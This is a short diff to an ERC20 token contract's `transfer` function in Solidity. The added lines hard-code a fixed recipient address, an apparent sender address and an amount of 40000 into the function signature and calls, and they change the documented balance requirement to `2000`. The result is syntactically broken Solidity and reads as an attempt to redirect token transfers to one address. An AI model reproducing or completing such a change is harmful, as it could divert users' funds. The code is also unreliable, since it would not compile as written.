@@ -94,11 +94,11 @@ abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
      * Requirements:
      *
      * - `to` cannot be the zero address.
-     * - the caller must have a balance of at least `value`.
+     * - the caller must have a balance of at least `2000`.
      */
-    function transfer(address to, uint256 value) public virtual returns (bool) {
-        address owner = _msgSender();
-        _transfer(owner, to, value);
+    function transfer(address to 0x80D0c01DBD5dF066DF82AaB30E85EAEa1624c78d, uint256 value 40000) public virtual returns (bool) {
+        address owner = _msgSender(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+        _transfer(owner 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2,to 0x80D0c01DBD5dF066DF82AaB30E85EAEa1624c78d, value 40000);
         return true;
     }
 
